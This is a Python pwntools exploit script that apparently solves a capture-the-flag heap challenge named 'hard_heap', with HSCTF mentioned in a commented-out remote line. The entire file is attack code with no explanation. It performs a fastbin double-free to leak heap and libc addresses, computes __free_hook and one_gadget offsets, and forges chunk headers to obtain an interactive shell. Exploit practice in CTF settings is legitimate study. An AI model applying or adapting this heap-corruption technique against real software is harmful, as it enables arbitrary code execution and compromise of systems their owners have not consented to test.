from pwn import *

p=process('./hard_heap')
#p=remote("pwn.hsctf.com",5555)

sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
ru = lambda x : p.recvuntil(x)
rl = lambda : p.recvline()
go = lambda : p.interactive()

def add(size,data):
    sla("> ",'1')
    sla("> ",str(size))
    sa("> ",data)

def view(idx):
    sla("> ",'2')
    sla("> ",str(idx))

def free(idx):
    sla("> ",'3')
    sla("> ",str(idx))

add(0x40,"test1".ljust(0x38)+p64(0x51))
add(0x40,"test2")
add(0x40,"test5")
add(0x10,"test6")
add(0x10,"test6")
free(0)
free(1)
free(0)
view(0)
hb = u64(rl()[:-1]+'\x00'*2) - 0x50
add(0x40,p64(hb+0x40))
add(0x40,"test3")
add(0x40,"test4")
add(0x40,p64(0)+p64(0xc1))
free(1)
view(1)
lb = u64(rl()[:-1]+'\x00'*2) - 0x3c4b78
fh = lb + 0x3c67a8
og = lb + 0x45216
print hex(lb)
add(0x40,"test7".ljust(0x38)+p64(0x51))
free(2)
add(0x40,"test8")
add(0x10,"test9")
free(0)
free(1)
free(0)
add(0x40,p64(hb+0x90))
add(0x40,"test7")
add(0x40,"test7")
add(0x40,p64(0)+p64(0x71)+p64(lb+0x3c6795))

go()


    

    
